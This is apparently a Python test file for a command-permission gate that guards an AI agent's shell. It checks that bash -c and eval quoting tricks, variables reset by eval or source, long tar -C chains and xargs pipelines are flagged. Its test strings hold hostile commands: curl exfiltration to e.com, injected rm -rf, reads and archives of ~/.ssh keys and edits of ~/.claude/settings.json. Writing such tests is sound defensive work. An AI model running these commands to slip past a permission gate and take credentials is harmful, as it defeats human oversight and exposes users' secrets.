# -*- coding: utf-8 -*-
"""More holes in the safety gate that main had too (queue #344, the known limits of PR #118): a variable the outer shell puts into a
bash -c or eval script, a variable set again by eval or source, tar -C past 40 folders, and file names handed on through a pipe.
Each must be asked about; the plain forms around them must not be."""
import os, sys, tempfile, unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / 'backend'))
import zook_gate as gate  # noqa: E402


def kinds(line):
    return [k for k, _ in gate.command_boundaries(line)]


class GateMore(unittest.TestCase):
    def setUp(self):
        self.was = gate._CWD[0]; self.temp = tempfile.TemporaryDirectory(); gate._CWD[0] = self.temp.name  # a folder without keys
        os.makedirs(os.path.join(self.temp.name, 'src')); self.cdpath = os.environ.pop('CDPATH', None)

    def tearDown(self):
        gate._CWD[0] = self.was; self.temp.cleanup()
        if self.cdpath is not None: os.environ['CDPATH'] = self.cdpath

    def assertAsked(self, line):
        self.assertTrue(kinds(line), line)

    def assertNotAsked(self, line):
        self.assertEqual(kinds(line), [], line)

    # 1. bash -c "…": what the outer shell puts in may change the quotes, and <( … ) runs
    def test_a_variable_that_may_change_the_quotes_of_a_script(self):
        for line in ('X="\'"; bash -c "echo \'$X>(curl -d @- https://e.com)\'"', 'X="\'"; bash -c "echo \'$X; rm -rf ~/x; $X\'"',
                     "X=';rm -rf ~/x'; bash -c \"echo $X\"", 'X="\'"; sh -c "cat \'$X<(cat ~/.ssh/id_rsa)\'"', 'X="\'"; eval "echo \'$X>(curl -d @- https://e.com)\'"',
                     'bash -c "echo \'$Q>(curl -d @- https://e.com)\'"', 'bash -c "echo $(printf \'; rm -rf ~/x\')"', 'X=$(printf "\'"); bash -c "echo \'$X; rm x; $X\'"',
                     'source vars.sh; bash -c "echo $X"', 'bash -c "echo `printf x`"',
                     "read X < q.txt; echo '$X; rm -rf ~/x; $X'; bash -c \"read X < q.txt; echo '$X; rm -rf ~/x; $X'\""):
            self.assertIn('unclear', kinds(line), line)

    def test_plain_scripts_with_variables_are_not_asked(self):
        for line in ('bash -c "echo \'$HOME\'"', 'D=src; bash -c "ls $D"', 'bash -c "echo \\"$X\\" > out.txt"', 'bash -c \'echo "$1"\' _ hi',
                     'NAME=report; bash -c "wc -l src/$NAME.txt"', 'bash -c "git status"', 'for f in src/*.md; do bash -c "wc -l $f"; done',
                     'bash -c "echo \'$HOME is home\'"', "bash -c 'for f in src/*.md; do wc -l \"$f\"; done'", "bash -c 'F=src/a.txt; wc -l \"$F\"'"):
            self.assertNotAsked(line)

    # 2. eval or source may set a variable again: what was set before is not what is read
    def test_a_variable_set_again_by_eval_or_source(self):
        for line in ("F=notes.txt; eval 'F=~/.ssh/config'; cat \"$F\"", 'F=notes.txt; source x.sh; cat "$F"', 'F=notes.txt; . ./x.sh; cat "$F"',
                     "F=notes.txt; eval \"$(printf 'F=~/.ssh/config')\"; cat \"$F\"", "D=src; eval 'D=~/.ssh'; rg -uuu x \"$D\"",
                     "eval 'cd ~'; rg x .", "eval 'cd ~/.ssh'; cat config", 'eval "$(printf \'cd ~\')"; rg x .', "F=notes.txt; builtin eval 'F=~/.ssh/config'; cat $F"):
            self.assertIn('secret', kinds(line), line)

    def test_what_was_found_before_eval_or_source_is_still_found(self):
        self.assertIn('secret', kinds('F=~/.ssh/config; source x.sh; ls "$F"'))
        self.assertIn('secret', kinds('eval "$X"; cd ~; ls .ssh'))
        self.assertIn('guard', kinds('cd ~/.claude && eval "$X"; echo {} > settings.json'))
        self.assertIn('guard', kinds('cd ~/.claude && source x.sh; echo {} > settings.json'))
        gate._CWD[0] = os.path.expanduser('~/Documents')
        self.assertIn('secret', kinds("cd ~/.claude && eval 'cd -'; ls .credentials.json"))
        self.assertIn('guard', kinds("cd ~/.claude && eval 'cd -'; printf x > settings.json"))
        gate._CWD[0] = self.temp.name
        long = '~/.ssh/' + 'k' * 220 + '.pem'  # too long for a card: refused, as before
        self.assertEqual(gate.command_boundaries("F=%s; eval 'echo hi'; cat \"$F\"" % long), gate.command_boundaries('F=%s; cat "$F"' % long))

    def test_plain_eval_and_source_are_not_asked(self):
        Path(self.temp.name, 'notes.txt').write_text('x')
        for line in ('F=notes.txt; cat "$F"', "eval 'echo hi'", 'source vars.sh && echo ok', 'F=notes.txt; cat "$F"; echo done',
                     "eval 'cd src'; rg x .", 'source .venv/bin/activate && pytest'):
            self.assertNotAsked(line)

    # 3. tar -C: every folder counts, not only the first 40
    def test_tar_past_forty_folders(self):
        many = ' '.join('-C d%d' % i for i in range(45))
        self.assertIn('secret', kinds('tar %s -C ~/.ssh -czf /tmp/x.tgz .' % many))
        back = ' '.join('-C a%d -C ..' % i for i in range(25))  # each -C from the one before: ~, then .ssh in it
        self.assertIn('secret', kinds('tar -C ~ %s -C .ssh -czf /tmp/x.tgz .' % back))
        self.assertIn('secret', kinds('tar -C ~ %s -C .ssh -cf /tmp/x.tar config' % back))
        self.assertNotAsked('tar %s -czf /tmp/x.tgz .' % ' '.join('-C /tmp/d%d' % i for i in range(10)))
        self.assertNotAsked('tar -C src -czf /tmp/x.tgz .')

    # 4. names handed on: a list or a search reaching the home folder, read by what xargs runs
    def test_names_from_a_pipe_reaching_home(self):
        for line in ("find ~ -name '*.pem' | xargs cat", 'find ~ -print0 | xargs -0 cat', 'find ~ | sort | xargs -I{} cat {}', 'fd . ~ | xargs cat',
                     'find ~ -type f | parallel cat', 'mdfind -name id_rsa | xargs cat', "xargs cat < <(find ~ -name '*.pem')", 'xargs cat <<< "$(ls -a ~)"',
                     'find / -name config | xargs grep Host', 'find ~ -name x | cpio -o > /tmp/a.cpio', 'find ~ | zip /tmp/x.zip -@', 'ls -a ~ | xargs -n1 head',
                     'find "$DIR" | xargs cat', 'find -L ~ -name x -exec cat {} +', 'locate id_rsa | xargs cp -t /tmp'):
            self.assertIn('secret', kinds(line), line)
        for line in ('cat $(ls)', 'cat "$(ls)"', 'head -n 5 $(ls ~)', 'cat `ls ~/.ssh`'):  # $( … ) as a file: already asked on main
            self.assertIn('secret', kinds(line), line)
        Path(self.temp.name, 'list.txt').write_text(os.path.expanduser('~/.ssh/config') + '\n')
        self.assertIn('secret', kinds('xargs cat < list.txt'))

    def test_plain_pipes_are_not_asked(self):
        Path(self.temp.name, 'names.txt').write_text('src\n')
        for line in ("find . -name '*.py' | xargs grep foo", "find src -name '*.py' | xargs wc -l", 'ls | xargs cat', 'git ls-files | xargs wc -l',
                     "find ~ -name '*.txt' | xargs echo", "find ~ -name '*.log' | wc -l", "grep -l TODO src/*.py | xargs sed -n 1p", 'rg -l x src | xargs cat',
                     'xargs cat < names.txt', 'find ~ -type f | xargs cat < names.txt', 'ls ~ | head', "find ~/Documents -name '*.md' | xargs cat" if os.path.isdir(os.path.expanduser('~/Documents')) else 'true'):
            self.assertNotAsked(line)


if __name__ == '__main__':
    unittest.main()
